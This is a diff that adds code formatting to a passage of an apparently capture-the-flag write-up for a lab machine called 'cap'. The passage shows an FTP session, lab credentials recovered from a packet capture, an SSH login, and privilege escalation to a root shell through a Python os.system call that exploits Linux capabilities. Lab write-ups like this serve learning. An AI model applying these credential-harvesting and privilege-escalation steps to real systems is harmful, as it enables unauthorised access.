@@ -2,6 +2,7 @@
 to get into ftp. it's litreally
 -----------------------------------------------------------------------------------------
 2.
+```bash
 220 (vsFTPd 3.0.3)
 USER nathan
 331 Please specify the password.
@@ -27,10 +28,12 @@ RETR notes.txt
 550 Failed to open file.
 QUIT
 221 Goodbye.
+```
 With this packet analysis i can obatain the creds called "nathan:Buck3tH4TF0RM3!" Now check the 
 ssh login with this.
 ---------------------------------------------------------
 3. Shell was gotten has nathan.
+```bash
 nathan@cap:~$ sudo -l
 [sudo] password for nathan: 
 Sorry, user nathan may not run sudo on cap.
@@ -102,4 +105,5 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> os.system("/bin/bash")
 root@cap:~# 
 Finally after getting the root shell linux capabilities.
+```
 =============================================================================
